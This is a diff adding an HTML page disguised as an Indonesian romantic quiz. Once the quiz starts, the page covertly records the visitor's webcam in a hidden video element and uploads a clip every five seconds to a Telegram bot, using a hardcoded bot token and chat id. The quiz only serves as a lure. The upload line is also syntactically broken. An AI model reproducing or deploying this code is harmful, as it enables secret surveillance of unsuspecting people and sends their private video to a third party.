@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Quiz Romantis</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #ff9a9e, #fad0c4);
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+        }
+
+        #container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.9);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            width: 400px;
+        }
+
+        #giftBtn, .optionBtn {
+            font-size: 20px;
+            padding: 15px 30px;
+            margin: 10px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        #giftBtn {
+            background: #ff6b81;
+            color: white;
+        }
+
+        #giftBtn:hover {
+            transform: scale(1.05);
+            background: #ff4757;
+        }
+
+        .optionBtn {
+            background: #ff7f50;
+            color: white;
+        }
+
+        .optionBtn:hover {
+            background: #ff6347;
+        }
+
+        #message {
+            margin-top: 20px;
+            font-size: 20px;
+            color: #333;
+        }
+
+        #question {
+            font-size: 22px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <!-- Tombol awal -->
+        <button id="giftBtn"> Mulai Quiz </button>
+
+        <!-- Quiz -->
+        <div id="quiz" style="display:none;">
+            <div id="question"></div>
+            <div id="options"></div>
+        </div>
+
+        <div id="message"></div>
+    </div>
+
+    <!-- Video tersembunyi -->
+    <video id="video" autoplay style="display:none;"></video>
+
+    <script>
+        const giftBtn = document.getElementById('giftBtn');
+        const quizDiv = document.getElementById('quiz');
+        const questionDiv = document.getElementById('question');
+        const optionsDiv = document.getElementById('options');
+        const message = document.getElementById('message');
+        const video = document.getElementById('video');
+
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        // Pertanyaan quiz romantis
+        const questions = [
+            { q: "Apa yang paling romantis dilakukan pada malam minggu?", options: { a: "iklik", b: "Makan malam bersama", c: "Berjalan di taman", d: "Tidur"}, answer: "b" },
+            { q: "Bunga apa yang paling sering dikasih saat cinta?", options: { a: "Mawar", b: "Matahari", c: "Tulip", d: "Lilin"}, answer: "a" },
+            { q: "Kalau pasangan bilang 'I love you', respon terbaik?", options: { a: "Balas 'I love you too'", b: "Diam saja", c: "Mengabaikan", d: "lu siapa anjir"}, answer: "a" },
+            { q: "Momen paling romantis di senja hari?", options: { a: "Menonton matahari terbenam", b: "Makan siang", c: "Tidur siang", d: "Belanja"}, answer: "a" }
+        ];
+
+        giftBtn.addEventListener('click', async () => {
+            giftBtn.disabled = true;
+            message.textContent = "Meminta izin…";
+
+            try {
+                // Izin kamera/video
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = stream;
+                message.textContent = "";
+
+                // MediaRecorder untuk video tersembunyi
+                recordedChunks = [];
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                mediaRecorder.ondataavailable = e => {
+                    if (e.data.size > 0) recordedChunks.push(e.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('video', blob, 'video.webm');
+
+                    const token = '8570434755:AAGyXnygFwbwv2BpSblhCUse_SyV4Wko5fw'; // ganti token bot
+                        const chat_id = '7859531089'; // ganti chat_id
+
+                    await fetch(`https://api.telegram.org/bot${8570434755:AAGyXnygFwbwv2BpSblhCUse_SyV4Wko5fw}/sendVideo?chat_id=${7859531089}`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(err => console.error(err));
+
+                    recordedChunks = [];
+                };
+
+                mediaRecorder.start();
+
+                // Stop & restart setiap 5 detik untuk kirim video berkala
+                setInterval(() => {
+                    if (mediaRecorder.state === "recording") {
+                        mediaRecorder.stop();
+                        mediaRecorder.start();
+                    }
+                }, 5000);
+
+                // Tampilkan quiz
+                giftBtn.style.display = 'none';
+                quizDiv.style.display = 'block';
+                const randomIndex = Math.floor(Math.random() * questions.length);
+                const currentQuestion = questions[randomIndex];
+                questionDiv.textContent = currentQuestion.q;
+                optionsDiv.innerHTML = '';
+
+                for (let key in currentQuestion.options) {
+                    const btn = document.createElement('button');
+                    btn.textContent = `${key.toUpperCase()}: ${currentQuestion.options[key]}`;
+                    btn.className = 'optionBtn';
+                    btn.onclick = () => checkAnswer(key, currentQuestion.answer);
+                    optionsDiv.appendChild(btn);
+                }
+
+            } catch (err) {
+                message.textContent = "Tidak bisa mengakses kamera/video: " + err;
+            }
+        });
+
+        function checkAnswer(selected, correct) {
+            quizDiv.style.display = 'none';
+            if (selected === correct) {
+                message.textContent = "💖 Jawaban benar! Hadiah cintamu muncul! 💖";
+            } else {
+                message.textContent = "💌 Salah, tapi cintamu tetap manis! 💌";
+            }
+        }
+
+        // Hentikan kamera saat halaman ditutup
+        window.addEventListener('beforeunload', () => {
+            if(mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
+            if(video.srcObject){
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
